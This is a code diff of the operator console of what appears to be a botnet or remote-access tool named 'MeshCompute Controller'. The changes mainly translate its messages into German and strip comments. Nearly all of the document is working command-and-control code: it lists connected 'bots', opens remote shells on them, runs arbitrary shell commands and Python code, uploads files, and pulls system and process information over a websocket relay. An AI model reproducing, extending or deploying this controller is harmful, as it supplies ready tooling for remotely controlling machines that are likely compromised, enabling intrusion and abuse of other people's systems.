@@ -1,3 +1,4 @@
+# controller/main.py
 import asyncio
 import json
 import os
@@ -13,14 +14,14 @@ init(autoreset=True)
 logging.basicConfig(level=logging.INFO)
 
 INTRO = f"""{Fore.CYAN}
-
+=====================================
 MeshCompute Controller
-
+=====================================
 Befehle:
   list | shell <bot_id> | upload <bot_id> <file> [remote_name]
   exec <bot_id> <command> | sysinfo <bot_id> | ps <bot_id>
   ping <bot_id> | exit
-{Style.RESET_ALL}"""
+====================================={Style.RESET_ALL}"""
 
 PROMPT = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"
 
@@ -40,6 +41,7 @@ class MeshController:
 
     async def connect(self):
         try:
+            # Verwende wss:// wenn TLS in der URL gesetzt ist (SERVER_URL konfigurierbar)
             self.ws = await websockets.connect(
                 SERVER_URL, ping_interval=20, ping_timeout=40
             )
@@ -48,9 +50,9 @@ class MeshController:
             )
             self.connected = True
             self.listener_task = asyncio.create_task(self._listen())
-            print(f"{Fore.GREEN}[+] Connected with relay server{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[+] Mit Relay-Server verbunden{Style.RESET_ALL}")
         except Exception as e:
-            print(f"{Fore.RED}[-] Connection failed: {e}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
             self.connected = False
 
     async def disconnect(self):
@@ -61,7 +63,7 @@ class MeshController:
             await self.ws.close()
 
     async def _listen(self):
-        # Receives all messages and puts them in the queue.
+        """Empfängt alle Nachrichten und legt sie in die Queue."""
         try:
             while self.connected:
                 raw = await self.ws.recv()
@@ -74,7 +76,7 @@ class MeshController:
             self.connected = False
 
     async def _get_response(self, task_id: str, timeout=10):
-        #Get a message with the appropriate task_id from the queue.
+        """Holt eine Nachricht mit der passenden task_id aus der Queue."""
         try:
             while True:
                 raw = await asyncio.wait_for(self.message_queue.get(), timeout=timeout)
@@ -84,14 +86,12 @@ class MeshController:
                     continue
                 if data.get("task_id") == task_id:
                     return data
-                # Messages without or with different task_id are ignored
-                # (could be old shell outputs, for example)
         except asyncio.TimeoutError:
             return None
 
     async def send_command(self, command: dict):
         if not self.connected or not self.ws:
-            print(f"{Fore.RED}Not connected.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Nicht verbunden.{Style.RESET_ALL}")
             return
         try:
             await self.ws.send(json.dumps(command))
@@ -100,7 +100,7 @@ class MeshController:
             if response:
                 self._print_result(response)
             else:
-                print(f"{Fore.RED}Timeout – no reply.{Style.RESET_ALL}")
+                print(f"{Fore.RED}Timeout – keine Antwort.{Style.RESET_ALL}")
         except Exception as e:
             print(f"{Fore.RED}Fehler: {e}{Style.RESET_ALL}")
             self.connected = False
@@ -110,7 +110,7 @@ class MeshController:
             print(data.get("output", ""), end="", flush=True)
             return
         if data.get("type") == "shell_exit":
-            print(f"\n{Fore.YELLOW}Shell has been terminated.{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}Shell wurde beendet.{Style.RESET_ALL}")
             self.in_shell = False
             self.current_shell_task = None
             return
@@ -119,21 +119,20 @@ class MeshController:
             return
         if data.get("type") == "file_upload_done":
             if data.get("error"):
-                print(f"{Fore.RED}Upload failed: {data['error']}{Style.RESET_ALL}")
+                print(f"{Fore.RED}Upload fehlgeschlagen: {data['error']}{Style.RESET_ALL}")
             else:
-                print(f"{Fore.GREEN}Upload successfully{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}✅ Upload erfolgreich{Style.RESET_ALL}")
             return
 
-        # Normal results
         if "bots" in data.get("data", {}):
             bots = data["data"]["bots"]
-            print(f"\n{Fore.CYAN}=== Connected Bots ({len(bots)}) ==={Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}=== Verbundene Bots ({len(bots)}) ==={Style.RESET_ALL}")
             for bot in bots:
                 print(f"  {Fore.GREEN}{bot.get('bot_id')}{Style.RESET_ALL}")
             return
 
         bot_id = data.get("bot_id", "Unknown")
-        print(f"\n{Fore.YELLOW}=== Output of {bot_id} ==={Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}=== Ausgabe von {bot_id} ==={Style.RESET_ALL}")
         if data.get("info"):
             for k, v in data["info"].items():
                 if k != "bot_id":
@@ -145,7 +144,6 @@ class MeshController:
         else:
             print(json.dumps(data, indent=2, ensure_ascii=False))
 
-    # ---- SHELL MODE ----
     async def shell_mode(self, bot_id: str, task_id: str):
         self.in_shell = True
         self.current_shell_task = task_id
@@ -163,7 +161,6 @@ class MeshController:
                         "command": "exit",
                         "task_id": task_id
                     }))
-                    # Wait to shell_exit
                     exit_resp = await self._get_response(task_id, timeout=5)
                     if exit_resp:
                         self._print_result(exit_resp)
@@ -173,20 +170,17 @@ class MeshController:
                     "command": cmd,
                     "task_id": task_id
                 }))
-                # Collect response(s)
                 while True:
                     resp = await self._get_response(task_id, timeout=10)
                     if resp is None:
                         break
                     if resp.get("type") == "shell_output":
                         print(resp.get("output", ""), end="", flush=True)
-                        # Continue to wait for possible further outputs (do not cancel)
                         continue
                     elif resp.get("type") == "shell_exit":
                         self._print_result(resp)
                         return
                     else:
-                        # Unexpected Type -> Exit
                         break
         except Exception:
             pass
@@ -194,7 +188,6 @@ class MeshController:
             self.in_shell = False
             self.current_shell_task = None
 
-    # ---- COMMAND PROCESSING ----
     async def handle_command(self, line: str):
         line = line.strip()
         if not line:
@@ -208,15 +201,12 @@ class MeshController:
                 return
             target = parts[1]
             task_id = self.next_task_id()
-            # Start Shell on the Bot
             await self.send_command({
                 "type": "command",
                 "action": "shell",
                 "target": target,
                 "task_id": task_id
             })
-            # Wait a moment, then boot into shell mode
-            await asyncio.sleep(0.3)
             await self.shell_mode(target, task_id)
             return
 
@@ -224,7 +214,7 @@ class MeshController:
             await self.send_command({"type": "command", "action": "list", "task_id": self.next_task_id()})
         elif cmd == "upload":
             if len(parts) < 3:
-                print("Usage: upload <bot_id> <file> [remote_name]")
+                print("Verwendung: upload <bot_id> <file> [remote_name]")
                 return
             target = parts[1]
             local_path = parts[2]
@@ -232,7 +222,7 @@ class MeshController:
             await self.upload_file(target, local_path, remote_name)
         elif cmd == "exec":
             if len(parts) < 3:
-                print("Usage: exec <bot_id> <command>")
+                print("Verwendung: exec <bot_id> <command>")
                 return
             target = parts[1]
             payload = " ".join(parts[2:])
@@ -253,7 +243,7 @@ class MeshController:
             })
         elif cmd == "python":
             if len(parts) < 3:
-                print("Usage: python <bot_id> `<code>`")
+                print("Verwendung: python <bot_id> `<code>`")
                 return
             target = parts[1]
             payload = " ".join(parts[2:])
@@ -265,7 +255,7 @@ class MeshController:
                 "task_id": self.next_task_id()
             })
         elif cmd in ("exit", "quit"):
-            print(f"{Fore.YELLOW}Exiting Controller...{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
             await self.disconnect()
             raise SystemExit
         elif cmd in ("clear", "cls"):
@@ -273,11 +263,11 @@ class MeshController:
         elif cmd == "help":
             print(INTRO)
         else:
-            print(f"{Fore.RED}Unknown command. Type 'help'.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Unbekannter Befehl. Tippe 'help'.{Style.RESET_ALL}")
 
     async def upload_file(self, target: str, local_path: str, remote_name: str = None):
         if not os.path.exists(local_path):
-            print(f"{Fore.RED}File not found.{Style.RESET_ALL}")
+            print(f"{Fore.RED}Datei nicht gefunden.{Style.RESET_ALL}")
             return
         try:
             with open(local_path, "rb") as f:
@@ -293,15 +283,14 @@ class MeshController:
                 "content": content_b64,
                 "task_id": task_id
             }))
-            print(f"{Fore.CYAN}Upload started...{Style.RESET_ALL}")
-            # Waiting for confirmation
+            print(f"{Fore.CYAN}Upload gestartet...{Style.RESET_ALL}")
             resp = await self._get_response(task_id, timeout=20)
             if resp:
                 self._print_result(resp)
             else:
-                print(f"{Fore.RED}No upload confirmation received.{Style.RESET_ALL}")
+                print(f"{Fore.RED}Keine Upload-Bestätigung erhalten.{Style.RESET_ALL}")
         except Exception as e:
-            print(f"{Fore.RED}Upload Error: {e}{Style.RESET_ALL}")
+            print(f"{Fore.RED}Upload Fehler: {e}{Style.RESET_ALL}")
 
 
 async def main():
